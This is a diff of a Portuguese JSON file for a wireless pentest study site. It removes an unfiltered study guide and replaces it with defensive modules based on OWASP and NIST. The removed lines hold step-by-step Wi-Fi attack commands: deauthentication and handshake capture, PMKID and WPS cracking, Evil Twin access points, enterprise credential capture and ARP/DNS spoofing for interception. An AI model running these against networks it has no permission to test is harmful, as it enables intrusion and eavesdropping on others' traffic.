@@ -1,11 +1,412 @@
 {
-  "metadata": {
-    "title": "MATERIAL DE ESTUDO PREMIUM - SEGURANÇA WIRELESS",
-    "subtitle": "Do Zero ao Raciocínio de Pentest",
-    "description": "Versão completa, sem filtros, reformatada para estudo direto",
-    "sourceFile": "material_estudo_premium_wireless_seguro.docx",
-    "contentHash": "01fdb8ccc4403f1277601df25e6bc920367b61f9200d10fb95e31d6e6044f349",
-    "generatedFrom": "C:\\Users\\Suporte\\Downloads\\material_estudo_premium_wireless_seguro.docx"
-  },
-  "conteudo_completo": "MATERIAL DE ESTUDO PREMIUM - SEGURANÇA WIRELESS\nDo Zero ao Raciocínio de Pentest\nVersão Completa - Sem Filtros\n\n---\n\nREGRAS DE OURO\n- Escopo primeiro: só pratique em rede própria, laboratório isolado ou ambiente autorizado por escrito.\n- Entenda antes de executar: saiba o que cada ferramenta tenta provar e qual evidência gera.\n- Relatório manda no jogo: pentest sem documentação vira bagunça.\n- Defesa é o fechamento: cada técnica estudada termina com mitigação e detecção.\n\n---\n\nMAPA DE ESTUDO\n\nFase 1 - Base Linux: Terminal, arquivos, permissões, comandos. Entrega: se mover no Kali sem se perder.\nFase 2 - Rede TCP/IP: IP, MAC, DNS, DHCP, gateway, portas. Entrega: ler uma rede como um mapa.\nFase 3 - Wireless 802.11: Canais, sinal, modos de placa, handshake. Entrega: entender o que acontece no ar.\nFase 4 - Ferramentas: Função, evidência, limitação. Entrega: saber quando usar cada uma.\nFase 5 - Técnicas: Ataques como hipóteses de teste. Entrega: traduzir técnica em risco e correção.\nFase 6 - Relatório: Checklist, escopo, vulnerabilidades. Entrega: relatório profissional.\n\n---\n\nMÓDULO 1: LINUX PARA PENTEST\n\nO Linux é um sistema operacional. Kali Linux é uma versão especial que já vem com ferramentas de segurança.\n\nO terminal é onde você digita comandos em vez de clicar em ícones.\n\nComandos Essenciais:\n\nwhoami - mostra quem você é\npwd - mostra onde você está\nls - lista arquivos (-la para detalhes, -lah para tamanho legível)\ncd - navega (.. volta, ~ vai pra home, - volta pra pasta anterior)\nmkdir - cria pasta (mkdir -p cria hierarquia)\ntouch - cria arquivo vazio\ncat - vê conteúdo de arquivo (-n numera linhas)\necho - imprime texto (> cria/sobrescreve arquivo, >> adiciona)\ncp - copia (cp -r copia pasta)\nmv - move/renomeia\nrm - deleta (CUIDADO: rm -rf é permanente!)\nnano - editor de texto (Ctrl+O salva, Ctrl+X sai, Ctrl+W pesquisa)\ngrep - procura texto (-i ignora maiúsc/minúsc, -r recursivo, -n mostra linha)\nchmod - permissões (chmod +x executável, 700 só dono, 777 todos - inseguro)\nsudo apt update/upgrade/install/remove - gerenciar pacotes\n\nRedirecionamentos:\n> salva saída em arquivo (sobrescreve)\n>> adiciona ao final\n| pipe: passa saída de um comando pra outro\n\nAtalhos: Tab (autocomplete), Ctrl+C (parar), Ctrl+D (sair), Ctrl+L (limpar), Ctrl+A (início), Ctrl+E (final), Seta↑ (último comando), Ctrl+R (pesquisar histórico)\n\n---\n\nMÓDULO 2: REDES TCP/IP\n\nIP: Endereço lógico (192.168.1.100)\nMAC: Endereço físico da placa (00:1A:2B:3C:4D:5E) - único no mundo\nGateway: Roteador que dá acesso à internet\nMáscara: Define o tamanho da rede (/24 = 254 hosts)\nDNS: Traduz nomes (google.com) para IPs\n\nComandos:\nip a - ver IP\nip route - ver gateway\narp -a ou ip neigh - tabela ARP (IP x MAC)\ncat /etc/resolv.conf - ver DNS\nping -c 4 destino - testar conexão\ntraceroute destino - ver caminho\nnslookup/dig destino - consultar DNS\nsudo dhclient -r && sudo dhclient - renovar IP\n\nPortas comuns:\n21 FTP | 22 SSH | 23 Telnet | 25 SMTP | 53 DNS | 80 HTTP | 443 HTTPS | 445 SMB | 3306 MySQL | 3389 RDP\n\nTCP: Confiável, confirma entrega (HTTP, SSH, FTP)\nUDP: Rápido, sem confirmação (DNS, streaming, jogos)\n\n---\n\nMÓDULO 3: WI-FI 802.11\n\n2.4 GHz: Maior alcance, menor velocidade, muita interferência, canais 1,6,11 não sobrepostos\n5 GHz: Menor alcance, maior velocidade, pouca interferência\n\ndBm (força do sinal):\n-30 excelente | -50 muito bom | -60 bom | -70 razoável | -80 fraco | -90 muito fraco\n\nModos de placa:\nManaged: modo normal, cliente conectado ao roteador\nMonitor: modo detetive, escuta tudo no ar sem se conectar\n\nAtivar modo monitor:\nsudo airmon-ng check kill\nsudo airmon-ng start wlan0\nCria interface wlan0mon\niwconfig para verificar\nsudo airmon-ng stop wlan0mon para desativar\n\nTipos de segurança:\nWEP: péssima, quebra em minutos\nWPA: fraca, ataque de dicionário\nWPA2: boa, mas quebrável com dicionário/PMKID/WPS\nWPA3: muito boa, Dragonblood/Downgrade\n\nHandshake: aperto de mão de 4 passos na conexão. Capture e descubra a senha testando milhares de senhas.\n\nWPS: PIN de 8 dígitos verificado em duas partes (4+4). 11 mil tentativas em vez de 100 milhões.\n\n---\n\nMÓDULO 4: FERRAMENTAS\n\naircrack-ng suite:\nsudo airmon-ng start wlan0 - ativar modo monitor\nsudo airodump-ng wlan0mon - ver redes ao redor\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon - focar em rede específica\nsudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon - deauth attack\naircrack-ng -w wordlist.txt captura-01.cap - quebrar senha\naircrack-ng captura-01.cap - verificar handshake no arquivo\nbesside-ng wlan0mon - modo automático\n\nbettercap:\nsudo bettercap - iniciar interface\nnet.show - ver dispositivos\nnet.sniff on - farejar tráfego\nset arp.spoof.targets IP e arp.spoof on - ARP spoofing\nwifi.ap on - criar AP falso\ndns.spoof on - DNS spoofing\n\nhashcat:\ncap2hccapx captura.cap captura.hccapx - converter\nhashcat -m 2500 captura.hccapx wordlist.txt - quebrar WPA/WPA2\nhashcat -m 22000 hash.hc22000 wordlist.txt - quebrar PMKID/WPA3\nhashcat -m 2500 captura.hccapx wordlist.txt -r /usr/share/hashcat/rules/best64.rule - com regras\n\nPMKID Attack:\nsudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1\nhcxpcapngtool -o hash.hc22000 captura.pcapng\nhashcat -m 22000 hash.hc22000 wordlist.txt\n\nWPS Attack:\nwash -i wlan0mon - verificar redes com WPS\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv - Pixie Dust\nsudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv - PIN normal\nsudo bully -b AA:BB:CC:DD:EE:FF wlan0mon - alternativa\n\n---\n\nMÓDULO 5: ATAQUES PASSO A PASSO\n\nATAQUE 1: WPA2 Handshake + Dicionário\n1. sudo airmon-ng check kill && sudo airmon-ng start wlan0\n2. sudo airodump-ng wlan0mon (anote BSSID, canal, ESSID)\n3. sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon\n4. Em outro terminal: sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon\n5. Quando aparecer WPA handshake, Ctrl+C\n6. aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap\n\nATAQUE 2: PMKID (sem cliente)\nsudo hcxdumptool -i wlan0mon -o captura.pcapng --enable_status=1\nhcxpcapngtool -o hash.hc22000 captura.pcapng\nhashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt\n\nATAQUE 3: Evil Twin\nCom bettercap:\nsudo bettercap -eval set wifi.ap.ssid RedeVerdadeira; wifi.ap on\n\nManual:\nsudo airbase-ng -e RedeVerdadeira -c 6 wlan0mon\nsudo ifconfig at0 up 192.168.10.1 netmask 255.255.255.0\nConfigurar dnsmasq com DHCP\n\nATAQUE 4: WPA Enterprise\nsudo apt install hostapd-wpe\nConfigurar /etc/hostapd-wpe/hostapd-wpe.conf\nsudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf\n\nATAQUE 5: Pós-Exploração (MITM)\nsudo bettercap -eval set arp.spoof.targets IP; arp.spoof on; net.sniff on\nsudo bettercap -eval set dns.spoof.all true; dns.spoof on\nsudo tcpdump -i wlan0mon port 80 -A - capturar tráfego HTTP\n\n---\n\nMÓDULO 6: ATAQUE VIA MOBILE (ANDROID)\n\nÉ POSSÍVEL? SIM!\n\nRequisitos:\n- Android com root (obrigatório para modo monitor)\n- Chipset compatível (Broadcom, MediaTek, Qualcomm)\n- Kali NetHunter instalado (recomendado)\n\nOpção 1: Kali NetHunter (recomendado)\nVersão do Kali Linux que roda em Android. Mesmas ferramentas do Kali desktop.\n1. Faça root (Magisk)\n2. Instale o app NetHunter\n3. Instale o chroot Kali\n4. Execute nethunter\nNo terminal: mesmos comandos do Kali (airmon-ng, airodump-ng, etc.)\n\nOpção 2: Apps sem NetHunter\nzANTI: escaneamento, MITM, SSL stripping (interface gráfica)\nWPSApp: testa WPS, Pi"
+  "packName": "Wireless Lab Drive - Conteúdo Seguro de Pentest",
+  "language": "pt-BR",
+  "version": "1.0.0",
+  "safetyScope": "Conteúdo educativo para laboratório autorizado. Não contém comandos de ataque, payloads ou automações ofensivas.",
+  "paletteRule": "Interface deve usar preto, branco, cinza e vermelho sutil.",
+  "sourceNotes": [
+    {
+      "name": "OWASP Web Security Testing Guide",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/",
+      "use": "Base para estruturar testes web autorizados, fases de teste, relatório e metodologia."
+    },
+    {
+      "name": "OWASP WSTG v4.2",
+      "url": "https://owasp.org/www-project-web-security-testing-guide/v42/",
+      "use": "Referência de categorias e organização de testes web em conteúdo educativo."
+    },
+    {
+      "name": "OWASP ASVS",
+      "url": "https://owasp.org/www-project-application-security-verification-standard/",
+      "use": "Base para requisitos de verificação de segurança de aplicações."
+    },
+    {
+      "name": "OWASP MASVS / Mobile Application Security",
+      "url": "https://mas.owasp.org/MASVS/",
+      "use": "Base para conteúdo seguro sobre avaliação mobile sem instruções ofensivas."
+    },
+    {
+      "name": "NIST SP 800-115",
+      "url": "https://csrc.nist.gov/pubs/sp/800/115/final",
+      "use": "Base para escopo, planejamento, execução autorizada, análise e mitigação."
+    },
+    {
+      "name": "NIST SP 800-153",
+      "url": "https://csrc.nist.gov/pubs/sp/800/153/final",
+      "use": "Base para segurança WLAN, configuração, ciclo de vida e monitoramento."
+    },
+    {
+      "name": "PortSwigger Web Security Academy",
+      "url": "https://portswigger.net/web-security/getting-started/index.html",
+      "use": "Referência de formato de aprendizado: teoria, prática controlada e progresso."
+    }
+  ],
+  "modules": [
+    {
+      "id": "escopo-etica",
+      "order": 1,
+      "title": "Escopo, Ética e Laboratório Autorizado",
+      "summary": "Antes de qualquer teste, o profissional define permissão, objetivo, limites e evidências.",
+      "blocks": [
+        {
+          "id": "escopo-01",
+          "title": "O que é pentest autorizado",
+          "type": "conceito",
+          "content": "Pentest autorizado é uma avaliação técnica feita com permissão explícita, escopo definido, janela de teste e objetivo documentado. O foco não é invadir por curiosidade; é encontrar riscos, provar impacto de forma controlada e orientar correções."
+        },
+        {
+          "id": "escopo-02",
+          "title": "Contrato mental do laboratório",
+          "type": "nota-de-campo",
+          "content": "Todo exercício do site deve assumir ambiente controlado: máquinas próprias, labs legais, CTFs, sistemas de treinamento ou autorização formal. Sem escopo, não existe teste profissional."
+        },
+        {
+          "id": "escopo-03",
+          "title": "Entregáveis de um teste",
+          "type": "checklist",
+          "items": [
+            "Objetivo do teste",
+            "Ativos permitidos",
+            "O que está fora do escopo",
+            "Janela de execução",
+            "Riscos aceitos",
+            "Evidências coletadas",
+            "Recomendações de correção"
+          ]
+        },
+        {
+          "id": "escopo-04",
+          "title": "Como pensar como consultor",
+          "type": "conceito",
+          "content": "O melhor relatório não é uma coleção de falhas. É uma tradução de risco técnico para decisão prática: o que aconteceu, por que importa, como corrigir e como validar a correção."
+        }
+      ]
+    },
+    {
+      "id": "linux-terminal",
+      "order": 2,
+      "title": "Linux e Terminal para Laboratório",
+      "summary": "Base operacional para navegar, organizar evidências e entender ambientes técnicos.",
+      "blocks": [
+        {
+          "id": "linux-01",
+          "title": "Terminal como painel de controle",
+          "type": "conceito",
+          "content": "O terminal é uma interface de precisão. No estudo defensivo, ele serve para navegar por arquivos, ler logs, organizar evidências, executar ferramentas autorizadas e entender como sistemas respondem."
+        },
+        {
+          "id": "linux-02",
+          "title": "Estrutura de arquivos e evidências",
+          "type": "checklist",
+          "items": [
+            "Criar pasta por projeto/laboratório",
+            "Separar anotações, capturas e resultados",
+            "Registrar data e contexto",
+            "Evitar misturar evidências de ambientes diferentes",
+            "Manter histórico de decisões"
+          ]
+        },
+        {
+          "id": "linux-03",
+          "title": "Permissões sem bagunça",
+          "type": "conceito",
+          "content": "Entender permissões ajuda a interpretar riscos sem sair alterando o ambiente. O foco do estudo é reconhecer impacto, não quebrar a máquina."
+        },
+        {
+          "id": "linux-04",
+          "title": "Rotina de estudo",
+          "type": "meta-diaria",
+          "content": "Leia um conceito, pratique em laboratório permitido, registre evidências e escreva a conclusão em linguagem simples."
+        }
+      ]
+    },
+    {
+      "id": "redes-tcp-ip",
+      "order": 3,
+      "title": "Redes TCP/IP",
+      "summary": "Fundamento para entender comunicação, roteamento, portas, serviços e segmentação.",
+      "blocks": [
+        {
+          "id": "redes-01",
+          "title": "IP, máscara e gateway",
+          "type": "conceito",
+          "content": "IP identifica o host, máscara define o alcance da rede e gateway conecta a rede local a outros destinos. Esse trio explica boa parte dos problemas e riscos de comunicação."
+        },
+        {
+          "id": "redes-02",
+          "title": "Portas e serviços",
+          "type": "conceito",
+          "content": "Portas expõem serviços. Em uma avaliação segura, o objetivo é inventariar o que deveria estar disponível, o que apareceu sem necessidade e o que precisa de restrição ou autenticação."
+        },
+        {
+          "id": "redes-03",
+          "title": "DNS, DHCP e identidade de rede",
+          "type": "nota-de-campo",
+          "content": "DNS resolve nomes, DHCP entrega configuração e registros ajudam a entender quem está na rede. Em defesa, esses dados ajudam a identificar inconsistências e ativos esquecidos."
+        },
+        {
+          "id": "redes-04",
+          "title": "Segmentação",
+          "type": "conceito",
+          "content": "Uma rede bem segmentada limita impacto. Visitantes, servidores, estações, IoT e administração não devem viver no mesmo espaço sem controle."
+        }
+      ]
+    },
+    {
+      "id": "wireless-80211",
+      "order": 4,
+      "title": "Wi‑Fi 802.11 e Segurança WLAN",
+      "summary": "Como redes sem fio funcionam e como defender configuração, acesso e monitoramento.",
+      "blocks": [
+        {
+          "id": "wifi-01",
+          "title": "Arquitetura WLAN",
+          "type": "conceito",
+          "content": "Uma WLAN combina clientes, pontos de acesso, controladoras e políticas. Segurança depende de configuração, autenticação, atualização, segmentação e monitoramento contínuo."
+        },
+        {
+          "id": "wifi-02",
+          "title": "Autenticação e criptografia",
+          "type": "conceito",
+          "content": "O estudo deve comparar modelos de autenticação, força de senhas, uso de WPA2/WPA3, isolamento de clientes e separação de redes convidadas."
+        },
+        {
+          "id": "wifi-03",
+          "title": "Checklist de defesa Wi‑Fi",
+          "type": "checklist",
+          "items": [
+            "Usar criptografia moderna",
+            "Separar rede corporativa e convidados",
+            "Remover credenciais padrão",
+            "Atualizar firmware",
+            "Reduzir exposição desnecessária",
+            "Monitorar APs desconhecidos",
+            "Documentar SSIDs e responsáveis"
+          ]
+        },
+        {
+          "id": "wifi-04",
+          "title": "Relatório WLAN",
+          "type": "relatorio",
+          "content": "Um bom relatório WLAN explica configuração atual, risco percebido, impacto no negócio, recomendações e forma de validar a correção sem expor detalhes sensíveis."
+        }
+      ]
+    },
+    {
+      "id": "metodologia-pentest",
+      "order": 5,
+      "title": "Metodologia de Teste Autorizado",
+      "summary": "Planejamento, execução controlada, evidência, análise e mitigação.",
+      "blocks": [
+        {
+          "id": "metodo-01",
+          "title": "Fases seguras",
+          "type": "conceito",
+          "content": "Um teste profissional passa por preparação, entendimento do alvo permitido, verificação controlada, análise, priorização, relatório e reteste. A qualidade está na organização."
+        },
+        {
+          "id": "metodo-02",
+          "title": "Evidência boa",
+          "type": "checklist",
+          "items": [
+            "Captura clara",
+            "Data e hora",
+            "Ativo relacionado",
+            "Impacto explicado",
+            "Risco sem exagero",
+            "Correção recomendada",
+            "Validação sugerida"
+          ]
+        },
+        {
+          "id": "metodo-03",
+          "title": "Severidade sem teatro",
+          "type": "conceito",
+          "content": "Severidade deve considerar probabilidade, impacto, exposição, facilidade de correção e contexto do ambiente. Nem tudo que parece técnico é crítico."
+        }
+      ]
+    },
+    {
+      "id": "web-owasp",
+      "order": 6,
+      "title": "Segurança Web com OWASP",
+      "summary": "Raciocínio de testes web, requisitos de segurança e categorias de risco.",
+      "blocks": [
+        {
+          "id": "web-01",
+          "title": "WSTG como mapa de estudo",
+          "type": "conceito",
+          "content": "O OWASP WSTG organiza testes web em categorias. Para estudo, ele funciona como mapa: entender objetivo, observar evidências, registrar impacto e propor correção."
+        },
+        {
+          "id": "web-02",
+          "title": "ASVS como régua de qualidade",
+          "type": "conceito",
+          "content": "O ASVS ajuda a transformar segurança em requisito verificável. Em vez de dizer 'está seguro', o relatório aponta quais controles foram avaliados e qual nível de confiança existe."
+        },
+        {
+          "id": "web-03",
+          "title": "Checklist web seguro",
+          "type": "checklist",
+          "items": [
+            "Autenticação clara",
+            "Controle de acesso por função",
+            "Validação de entrada",
+            "Sessões protegidas",
+            "Logs úteis",
+            "Erros sem vazamento de informação",
+            "Configuração segura"
+          ]
+        },
+        {
+          "id": "web-04",
+          "title": "Prática controlada",
+          "type": "nota-de-campo",
+          "content": "Use ambientes de treinamento legalizados. O objetivo é consolidar raciocínio, não testar sistemas aleatórios."
+        }
+      ]
+    },
+    {
+      "id": "mobile-android",
+      "order": 7,
+      "title": "Segurança Mobile Android",
+      "summary": "Avaliação defensiva de apps mobile usando critérios de armazenamento, rede, autenticação e privacidade.",
+      "blocks": [
+        {
+          "id": "mobile-01",
+          "title": "Mobile é avaliação autorizada",
+          "type": "correcao",
+          "content": "Substitua nomenclaturas antigas por 'Segurança Mobile Android'. O foco da página deve ser avaliação autorizada, proteção de dados e verificação de controles."
+        },
+        {
+          "id": "mobile-02",
+          "title": "MASVS como base",
+          "type": "conceito",
+          "content": "O OWASP MASVS organiza controles para apps mobile, incluindo armazenamento seguro, comunicação, autenticação, criptografia, privacidade e resiliência."
+        },
+        {
+          "id": "mobile-03",
+          "title": "O que observar em apps",
+          "type": "checklist",
+          "items": [
+            "Dados sensíveis armazenados",
+            "Comunicação protegida",
+            "Autenticação e sessão",
+            "Permissões solicitadas",
+            "Logs em produção",
+            "Configuração de build",
+            "Privacidade e consentimento"
+          ]
+        },
+        {
+          "id": "mobile-04",
+          "title": "Resultado esperado",
+          "type": "relatorio",
+          "content": "A entrega mobile deve explicar risco, evidência e recomendação, sem expor segredos do app ou instruções reutilizáveis fora do laboratório autorizado."
+        }
+      ]
+    },
+    {
+      "id": "ferramentas-e-evidencias",
+      "order": 8,
+      "title": "Ferramentas, Evidências e Organização",
+      "summary": "Como usar ferramentas de forma responsável e transformar saída técnica em entendimento.",
+      "blocks": [
+        {
+          "id": "tools-01",
+          "title": "Ferramenta não substitui raciocínio",
+          "type": "conceito",
+          "content": "Ferramentas ajudam a coletar sinais, mas o valor está em interpretar resultado, confirmar contexto e explicar o risco de forma compreensível."
+        },
+        {
+          "id": "tools-02",
+          "title": "Registro de evidências",
+          "type": "checklist",
+          "items": [
+            "Salvar origem do dado",
+            "Anotar hipótese",
+            "Anotar resultado",
+            "Separar falso positivo",
+            "Escrever impacto",
+            "Criar recomendação"
+          ]
+        },
+        {
+          "id": "tools-03",
+          "title": "Boas práticas",
+          "type": "nota-de-campo",
+          "content": "Use ferramentas apenas em ambiente autorizado. Evite executar qualquer teste fora do escopo e registre decisões técnicas durante o processo."
+        }
+      ]
+    },
+    {
+      "id": "defesa-hardening",
+      "order": 9,
+      "title": "Defesa, Hardening e Monitoramento",
+      "summary": "Corrigir, reduzir exposição e acompanhar o ambiente depois do teste.",
+      "blocks": [
+        {
+          "id": "defesa-01",
+          "title": "Hardening",
+          "type": "conceito",
+          "content": "Hardening é reduzir superfície de ataque: remover o que não precisa, configurar com segurança, atualizar componentes e limitar acessos."
+        },
+        {
+          "id": "defesa-02",
+          "title": "Monitoramento",
+          "type": "conceito",
+          "content": "Sem monitoramento, falhas voltam despercebidas. Logs, alertas, inventário e revisão periódica ajudam a manter o ambiente sob controle."
+        },
+        {
+          "id": "defesa-03",
+          "title": "Checklist pós-correção",
+          "type": "checklist",
+          "items": [
+            "Correção aplicada",
+            "Configuração revisada",
+            "Reteste realizado",
+            "Evidência atualizada",
+            "Responsável definido",
+            "Prazo registrado"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "relatorio-profissional",
+      "order": 10,
+      "title": "Relatório Profissional",
+      "summary": "Transformar estudo técnico em entrega clara, útil e confiável.",
+      "blocks": [
+        {
+          "id": "relatorio-01",
+          "title": "Estrutura recomendada",
+          "type": "checklist",
+          "items": [
+            "Resumo executivo",
+            "Escopo",
+            "Metodologia",
+            "Achados",
+            "Evidências",
+            "Risco",
+            "Recomendações",
+            "Plano de correção",
+            "Reteste"
+          ]
+        },
+        {
+          "id": "relatorio-02",
+          "title": "Linguagem",
+          "type": "conceito",
+          "content": "Relatório bom é direto: explica o problema, por que importa, onde foi visto e como corrigir. Evite drama técnico e evite esconder incertezas."
+        },
+        {
+          "id": "relatorio-03",
+          "title": "Portfólio de estudo",
+          "type": "nota-de-campo",
+          "content": "Em labs legais, transforme cada módulo em um mini relatório. Isso cria portfólio e melhora sua leitura profissional."
+        }
+      ]
+    }
+  ]
 }
